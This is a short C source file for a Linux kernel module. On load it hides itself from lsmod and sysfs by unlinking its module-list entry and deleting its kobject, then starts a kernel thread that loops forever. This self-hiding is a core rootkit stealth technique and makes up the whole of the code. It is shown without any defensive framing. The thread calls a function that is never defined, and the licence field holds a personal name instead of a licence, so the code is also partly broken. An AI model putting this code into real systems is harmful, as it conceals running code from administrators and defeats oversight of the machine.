#include <asm/uaccess.h>
#include <linux/delay.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/list.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/unistd.h>

MODULE_LICENSE("Zihan Guo");

static int kthread_func(void *data) {
	printk(KERN_INFO "I'm in kthread_func.\n");
	do {
		all_kthread_name();
		msleep_interruptible(1000*60);
	} while (1);
	return 0;
}

static int hide_thread_init(void) {
	printk(KERN_INFO "Hide my module from lsmod.");
	list_del_init(&THIS_MODULE->list);
	printk(KERN_INFO "Hide my module from sysfs.");
#ifdef CONFIG_SYSFS
	kobject_del(&THIS_MODULE->mkobj.kobj);
#endif
	printk(KERN_INFO "Start kthread_func.");
	struct task_struct *tsk = kthread_run(kthread_func, NULL, "my_kthread");
	if (IS_ERR(tsk)) 
		printk(KERN_INFO "create kthread failed!\n");
	else 
		printk(KERN_INFO "create kthread ok!\n");
	printk(KERN_INFO "Finish to start kthread_func.");

	return 0;
}
static void hide_thread_cleanup(void)
{
}

module_init(hide_thread_init);
module_exit(hide_thread_cleanup);
